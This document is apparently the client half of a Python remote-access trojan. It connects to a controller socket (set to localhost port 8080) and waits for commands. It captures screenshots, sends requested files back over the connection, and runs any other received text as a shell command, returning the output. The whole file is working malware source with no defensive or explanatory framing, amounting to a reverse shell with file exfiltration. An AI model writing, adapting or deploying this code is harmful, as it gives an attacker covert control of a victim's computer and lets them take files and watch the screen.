import socket
import pyautogui
import os
import subprocess
from VideoCapture import Device

client_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client_socket.connect(('127.0.0.1',8080))

def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(4)
        while packet:
            s.send(packet)
            packet = f.read(4)
        s.send("done".encode())
        print("done")
        f.close()

while True:
    data = client_socket.recv(1024).decode()
    if data == "EXIT":
        break
    if data == "screenshot":
        screenshot = pyautogui.screenshot()
        screenshot.save("screen.png")

    elif data == "grab":
        path = client_socket.recv(1024).decode()
        try:
            transfer(client_socket, path)
        except:
            client_socket.send("error".encode())
    else:
        CMD = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.PIPE)
        client_socket.send(CMD.stdout.read())
        client_socket.send(CMD.stderr.read())


client_socket.close()
